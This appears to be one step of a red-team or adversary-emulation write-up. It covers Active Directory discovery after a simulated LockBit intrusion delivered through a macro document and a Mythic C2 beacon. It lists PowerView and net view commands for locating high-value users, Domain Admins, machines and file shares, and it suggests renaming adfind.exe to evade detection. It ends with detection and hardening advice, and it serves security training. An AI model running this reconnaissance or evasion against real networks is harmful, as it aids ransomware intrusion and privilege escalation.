# Step 4: Domain Discovery

**Objective**: Enumerate Active Directory domain information (users, machines, shares, GPOs) to identify high-value targets (HVTs) in HR, FIN, ENG, and RND subnets, and prepare for lateral movement and privilege escalation.

---

## Context

- **Target system**: `HR/FIN/ENG/RND subnets` (domain-joined, internal)  
- We have established a foothold at the "exterior" of the network, and have a beacon notifying our Mythic server with status updates.

---

## Execution

### 1. Initial Access Recap

- LockBit executable dropped and executed from the `minecraft.exe` payload delivered via `.docm` file with macro.
- Callback to C2 established.

### 2. Enumerate Active Directory Domain Info

- Run **ADRecon** using renamed `adfind.exe` or use `PowerView` to avoid static IOC detections.

#### PowerView Commands:

```powershell
Import-Module .\PowerView.ps1

# Identify HVTs by department
Get-DomainUser -Properties * | Where-Object { $_.Department -in "HR","FIN","ENG","RND" }

# Enumerate active machines
Get-DomainComputer -Properties * | Select-Object Name,OperatingSystem,LastLogonDate

# Get high privilege groups
Get-DomainGroupMember -Identity "Domain Admins"

```
#### Reverse DNS Lookups:

```powershell
# peek at VMs on network
[System.Net.Dns]::GetHostEntry("10.10.40.23")
```

#### File Share Enumeration:

```powershell
# find shared folders
net view /domain
net view *name of a file server*
```

#### OU Enumeration:

- Use LDAP to find organizational unit (OU) structure and workstation naming patterns
    - ex.  `OU=HR,DC=corp,DC=domain,DC=local`

---

## Result

- Identified HVTs in HR, FIN, ENG, RND departments  
- Mapped active machines and domain structure  
- Located accessible file shares and potential lateral movement paths  
- Positioned for credential theft or privilege escalation  

---

## Detection Opportunities

| Vector | Description
|-|-|
| Enumeration of AD objects from non-priv accounts | Sudden or excessive LDAP/SMB queries from standard user accounts may indicate enumeration.             |
| Execution of ADFind / PowerView      | Known IOCs like ADFind.exe can be flagged by EDR unless renamed; PowerShell ADSISearcher modules leave distinct forensic traces. |
| Unusual traffic to DC from user-workstation | LockBit-like enumeration from a non-admin user to Domain Controllers or file servers stands out in baseline behavior. |

---

## Defensive Countermeasures

- **Detection**: Monitor for abnormal LDAP requests per host/account, look for enumeration patterns from non-admin users.  
- **Containment**: Immediately flag and isolate accounts or machines conducting excessive domain enumeration.  
- **Hardening**:  
  - Obfuscate sensitive AD group names and OU structures
  - Enable AMSI logging for PowerShell activity  
  - Rigid group policies to restrict untrusted scripts/binaries from running  
